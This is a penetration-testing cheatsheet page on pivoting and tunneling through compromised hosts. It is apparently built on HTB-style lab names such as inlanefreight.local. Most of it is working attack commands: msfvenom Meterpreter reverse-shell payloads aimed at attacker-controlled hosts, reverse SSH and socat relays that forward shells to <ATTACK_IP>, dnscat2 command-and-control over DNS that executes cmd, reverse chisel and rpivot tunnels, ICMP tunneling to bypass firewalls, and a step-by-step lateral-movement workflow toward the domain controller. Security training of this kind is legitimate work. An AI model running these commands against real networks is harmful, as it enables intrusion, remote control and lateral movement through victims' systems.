---
title: "Pivoting & Tunneling"
description: "Chisel, ligolo, SSH tunnels, and proxychains for lateral movement."
sidebar:
  order: 1
  label: "Pivoting & Tunneling"
---
> Techniques for moving between segmented networks using a compromised host as a pivot point. SSH tunnels, Chisel, Sshuttle, Meterpreter routing, Netsh, and more.

---


## Pre-Pivot Reconnaissance

```bash
# On the compromised pivot host — identify accessible networks
ifconfig                           # Linux — look for multiple NICs
ip addr                            # Linux alternative
ipconfig                           # Windows

# View routing table
netstat -r                         # Linux
ip route                           # Linux
route print                        # Windows

# Ping sweep to discover hosts on the internal network
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

## SSH — Tunneling and Port Forwarding

### Local Port Forwarding (`-L`)

```bash
# Expose remote service on localhost of the attack host
# Scenario: MySQL on the pivot host is not accessible from the outside
ssh -L 1234:localhost:3306 ubuntu@<PIVOT_IP>
# → now: mysql -u root -h 127.0.0.1 -P 1234

# Multiple simultaneous ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<PIVOT_IP>

# Expose service on an INTERNAL host (not the pivot itself)
ssh -L 8443:172.16.5.25:443 ubuntu@<PIVOT_IP>
```

### Dynamic Port Forwarding (`-D`) — SOCKS Proxy

```bash
# Create SOCKS proxy on the attack host via SSH to the pivot
ssh -D 9050 ubuntu@<PIVOT_IP>

# Configure proxychains
tail -4 /etc/proxychains.conf
# → add/verify: socks4 127.0.0.1 9050

# Use tools through the proxy
proxychains nmap -v -Pn -sT 172.16.5.19           # complete TCP scan
proxychains nmap -v -sn 172.16.5.1-200            # host discovery
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains msfconsole                            # complete Metasploit
```

> **Proxychains Rule:** Only works with full TCP connect scans (`-sT`). Does not work with SYN scans or ICMP. ICMP pings to Windows hosts can fail due to Windows Defender.

### Remote Port Forwarding (`-R`)

```bash
# Scenario: we have RDP to the pivot (Windows), and we want to receive a reverse shell from the internal target
# The internal target connects to pivot:8080 → attack host:8000

# On attack host: start handler on port 8000
msf6 exploit(multi/handler) > set LPORT 8000

# On attack host: create reverse SSH tunnel
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PIVOT_IP> -vN

# Generate payload pointing to the pivot
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 LPORT=8080 -f exe -o payload.exe
```

---

## Sshuttle — Transparent Proxy (Without proxychains)

```bash
# Install
sudo apt-get install sshuttle

# Redirect ALL traffic to the internal network via SSH
sudo sshuttle -r ubuntu@<PIVOT_IP> 172.16.5.0/23 -v

# Afterwards: tools work directly (without proxychains)
nmap -v -A -sT -p3389 172.16.5.19 -Pn
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> **Advantage vs Proxychains:** No need to prefix every command. Transparent at the iptables level.

---

## Meterpreter Tunneling

### Autoroute + SOCKS Proxy

```bash
# 1. Obtain a Meterpreter session on the pivot host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATACK_IP> LPORT=8080 -f elf -o pivot.elf

# 2. Add routes to the internal network
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.5.0 SESSION=1
# alternative:
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p                 # list active routes

# 3. Start SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run

# 4. Proxychains → can now reach the internal network
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

# Ping sweep from Meterpreter (without proxychains)
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### portfwd — Specific Port Forwarding

```bash
# Forward: local:3300 → internal:3389
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# → xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Reverse port forward: internal:1234 → attack host:8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACK_IP>

# List active rules
meterpreter > portfwd list
```

---

## Chisel — TCP/UDP over HTTP (Linux/Windows)

### Standard Mode — Server on the Pivot Host

```bash
# On the pivot host: start server
./chisel server -v -p 1234 --socks5

# On the attack host: connect as client
./chisel client -v <PIVOT_IP>:1234 socks
# → SOCKS5 listener on localhost:1080

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Reverse Mode — Server on the Attack Host

```bash
# Useful when the pivot host cannot receive incoming connections

# On the attack host: server with --reverse
sudo ./chisel server --reverse -v -p 1234 --socks5

# On the pivot host: client connects to the attack host
./chisel client -v <ATTACK_IP>:1234 R:socks
# → SOCKS5 on attack host:1080
```

> **Tip:** If there is a glibc error on the target, use a precompiled version for the same OS from GitHub Releases.

---

## Socat — Bidirectional Relay

```bash
# Redirect incoming connections → internal host (reverse shell)
# pivot listens on 8080, forwards to attack host:80
socat TCP4-LISTEN:8080,fork TCP4:<ATTACK_IP>:80

# Bind shell redirect: pivot:8080 → Windows:8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# With Metasploit:
# Payload points to pivot:8080, handler on attack host:80
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe
msf6 > use multi/handler → set LPORT 80
```

---

## Windows — Native Tools

### Netsh — Native Port Forwarding

```powershell
# Create rule: Windows pivot listens on 8080, redirects to internal:3389
netsh.exe interface portproxy add v4tov4 `
  listenport=8080 listenaddress=<PIVOT_IP> `
  connectport=3389 connectaddress=172.16.5.25

# Verify active rules
netsh.exe interface portproxy show v4tov4

# Delete rule
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=<PIVOT_IP>

# Connect from attack host
xfreerdp /v:<PIVOT_IP>:8080 /u:victor /p:pass@123
```

### Plink.exe — Dynamic SSH from Windows

```powershell
# Create SOCKS proxy on Windows attack host
plink -ssh -D 9050 ubuntu@<PIVOT_IP>

# Afterwards: configure Proxifier on Windows to use 127.0.0.1:1080
# mstsc.exe → connect to internal RDP
```

### SocksOverRDP — SOCKS over RDP Session

```powershell
# 1. On the Windows pivot host: load DLL plugin
regsvr32.exe SocksOverRDP-Plugin.dll

# 2. Connect to internal host via mstsc.exe
# → The plugin intercepts and creates SOCKS listener on 127.0.0.1:1080

# 3. On the internal host: start server
SocksOverRDP-Server.exe

# 4. Verify listener
netstat -antb | findstr 1080

# 5. Configure Proxifier on the pivot → forward to 127.0.0.1:1080
```

---

## DNS/ICMP Tunneling — Firewall Bypass

### Dnscat2 — C2 over DNS TXT

```bash
# Attack host: dnscat2 server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/ && sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=<ATTACK_IP>,port=53,domain=inlanefreight.local --no-cache
# → provides --secret for the client

# Windows target: PowerShell client
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACK_IP> -Domain inlanefreight.local \
  -PreSharedSecret <SECRET> -Exec cmd

# Interact with established session
dnscat2> window -i 1     # open session
dnscat2> windows          # list sessions
```

### Ptunnel-ng — SSH over ICMP

```bash
# Pivot host: start server (requires root)
sudo ./ptunnel-ng -r<PIVOT_IP> -R22

# Attack host: client connects via ICMP
sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22

# SSH through the ICMP tunnel
ssh -p2222 -lubuntu 127.0.0.1

# Add SOCKS proxy over the ICMP tunnel
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## Rpivot — Reverse SOCKS Proxy (Python 2.7)

```bash
# Attack host: rpivot server
git clone https://github.com/klsecservices/rpivot.git
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot host: client connects to the attack host
scp -r rpivot ubuntu@<PIVOT_IP>:/home/ubuntu/
python2.7 client.py --server-ip <ATTACK_IP> --server-port 9999

# With corporate NTLM proxy
python client.py --server-ip <TARGET_IP> --server-port 8080 \
  --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 \
  --domain <DOMAIN> --username <user> --password <pass>

# On attack host: proxychains → 127.0.0.1:9050
proxychains firefox-esr 172.16.5.135:80
```

---

## Quick Reference — Technique Comparison

| Technique | Pivot OS | Requires | SOCKS Port | Advantage |
|---------|----------|----------|-------------|---------|
| SSH -D | Linux | SSH | 9050 | Native, no tools |
| SSH -R | Linux | SSH | — | Reverse shell from internal network |
| Sshuttle | Linux | SSH + Python | — | Transparent, no proxychains |
| Chisel (std) | Linux/Win | Chisel binary | 1080 | HTTP, bypasses firewalls |
| Chisel (rev) | Linux/Win | Chisel binary | 1080 | Pivot does not receive incoming connections |
| Meterpreter | Linux/Win | Metasploit | 9050 | Integrated, post-exploitation |
| Netsh | Windows | Admin | — | Native LOL binary |
| Plink.exe | Windows | PuTTY | 9050 | No extra tools |
| Dnscat2 | Linux/Win | Outbound DNS | — | Bypasses HTTP/HTTPS firewall |
| Ptunnel-ng | Linux | Outbound ICMP | — | Bypasses firewall without DNS |

---

## Step-by-Step Pivoting Workflow

```
1. Compromise pivot host (webshell, RCE, SSH creds)
2. ifconfig / ip addr → identify NICs and internal networks
3. Ping sweep / nmap via proxychains → discover internal hosts
4. Choose technique based on available access (see table above)
5. Scan internal hosts: proxychains nmap -Pn -sT <host>
6. Compromise internal host → new pivot point
7. Repeat → tunnel deeper towards DC / final target
```

---

## Pitfalls / Gotchas

- **proxychains only TCP connect scan** → use `-sT` with nmap, not `-sS` (SYN). ICMP results are unreliable.
- **Chisel glibc mismatch** → compile on the same OS as the target, or use a precompiled binary from GitHub Releases.
- **SSH -D blocked by firewall** → change to port 443 (`ssh -D 9050 -p443 ubuntu@<IP>`).
- **Meterpreter autoroute** → does not work if the session is a basic shell; requires a real Meterpreter session.
- **Sshuttle is not compatible with Windows attack host** — only works on Linux/macOS.
- **Dnscat2** → DNS traffic may be detected if the SOC monitors anomalous TXT queries.
- **Ptunnel-ng** → requires root privileges on the pivot host (raw socket for ICMP).
- **Netsh portproxy** → requires admin privileges on Windows; does not persist if the service restarts without `sc.exe`.
- **proxychains + xfreerdp** → can be slow; reduce colors and disable effects in mstsc.
- **SocksOverRDP** → needs DLL loading with `regsvr32` AND server running on the destination host. Double hop.
- **SSH -R syntax** → `ssh -R <pivot_listen_ip>:<pivot_port>:0.0.0.0:<local_port>` — the order matters.

---

## 🛠️ Related Tools (pwnVader Ecosystem)

<aside class="my-6 p-4 rounded-md border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-[#cba6f7] font-bold mb-1">
    Tool · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    Want to quickly structure and generate redirection commands? Design your Chisel, SSH Port Forwarding, or Ligolo commands interactively using the <a href="https://hacking.pwnvader.com/networking/tunneling" class="text-[#cba6f7] hover:underline">Tunneling & Pivoting Designer</a> in our serverless suite.
  </p>
</aside>

---

## Related Cheatsheets

- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — generate payloads pointing to the pivot instead of the attack host
- [Using the Metasploit Framework](/en/metodologias/exploitation/metasploit-framework/) — autoroute, portfwd, and socks_proxy in depth
- [File Transfers](/en/metodologias/privesc/file-transfers/) — transfer tools (chisel, plink) to the pivot host
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — pivoting to the DC from foothold
- [Attacking Enterprise Networks](/en/metodologias/active-directory/attacking-enterprise-networks/) — end-to-end workflow with multiple pivots
